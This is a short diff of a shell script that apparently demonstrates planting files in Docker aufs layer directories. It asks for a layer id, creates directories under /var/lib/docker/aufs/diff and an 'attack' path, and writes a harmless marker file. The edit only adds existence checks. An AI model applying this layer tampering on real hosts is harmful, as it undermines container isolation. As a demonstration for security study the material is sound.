@@ -9,9 +9,14 @@ echo "Please give layer's id:"
 read layer
 
 #####Must be in the sudoers to do this
-mkdir /var/lib/docker/aufs/diff/${layer}/doot
+if [ ! -d /var/lib/docker/aufs/diff/${layer}/doot ]; then
+	mkdir /var/lib/docker/aufs/diff/${layer}/doot
+fi
 
-mkdir ${attack}/restricted_area
+if [ ! -d ${attack}/restricted_area ]; then
+	mkdir ${attack}/restricted_area
+fi
+
 touch ${attack}/restricted_area/HellloFromTheOtherSide
 
 ######sudo or not sudo
